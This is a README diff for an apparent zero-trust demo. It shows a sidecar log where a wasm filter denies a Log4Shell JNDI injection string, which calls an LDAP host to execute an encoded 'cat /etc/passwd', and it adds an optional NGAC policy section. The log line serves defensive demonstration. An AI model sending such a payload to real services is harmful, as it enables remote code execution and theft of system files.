@@ -184,3 +184,9 @@ We can check that the sidecar proxy in the application pod is rejecting hte traf
 kubectl -n zta-demo logs -l app=vulnerable -c istio-proxy | grep wasm
 2022-01-24T08:35:18.968121Z	info	envoy wasm	wasm log zta-demo.log4shell-patch: access denied for: ${jndi:ldap://log4shell:1389/exec/Y2F0IC9ldGMvcGFzc3dkCg==}
 ```
+
+## 5. (Optional) NGAC policy enforcement
+
+Now that we have all the primitives we need to implement a Zero Trust Architecture, we can look at how we can apply more high level
+access control policies with NGAC. You can follow the steps in the [ngac/README.md](ngac/README.md) to configure user custom claims
+and enforce access using an NGAC graph.
